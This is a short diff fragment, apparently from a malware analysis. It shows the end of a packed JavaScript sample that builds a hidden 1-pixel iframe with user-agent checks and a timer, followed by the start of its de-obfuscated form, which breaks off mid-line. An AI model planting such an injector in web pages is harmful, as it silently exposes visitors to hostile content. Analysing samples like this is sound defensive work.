@@ -1,0 +1,7 @@
+ar|do​cument|if|1px|MakeFrameEx|element|yahoo_api|height| width|display|none|body|get​ElementById|function|createElement|iframe|append​Child|src|id|nl|msie| toLowerCase|opera|webtv||setTimeout|windows|http|userAgent|1000|juyfdjhdjdgh|navigator|ai| showthread|php|72241732'.split('|'),0,{}))
+</sc​ript>
+
+Which de-obfuscates to ->
+
+function MakeFrameEx(){
+  element = do​cument.get​ElementB
